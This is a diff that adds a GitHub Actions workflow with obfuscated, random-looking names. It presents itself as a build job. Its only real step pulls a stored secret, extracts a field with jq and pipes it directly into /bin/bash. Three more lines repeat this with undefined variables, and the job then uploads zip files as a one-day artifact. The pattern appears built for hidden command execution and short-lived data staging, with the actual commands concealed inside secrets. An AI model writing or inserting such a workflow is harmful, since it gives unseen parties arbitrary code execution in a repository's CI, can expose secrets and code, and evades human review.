@@ -1,0 +1,24 @@
+name: bridget6442ff
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bridget6442ff
+        env:
+          iate6: ${{ secrets.iate6 }}
+        run: |
+          printf '%s' "$iate6" | jq -r .ih4008 | /bin/bash
+          echo $xmbc00 | jq -r .zeq62551 | /bin/bash
+          printf '%s' "$mjp88" | jq -r .am61 | /bin/bash
+          printf '%s' "$wp96004" | jq -r .rjzw9767 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: r5X2gMq2
+          path: "*.zip"
+          retention-days: 1
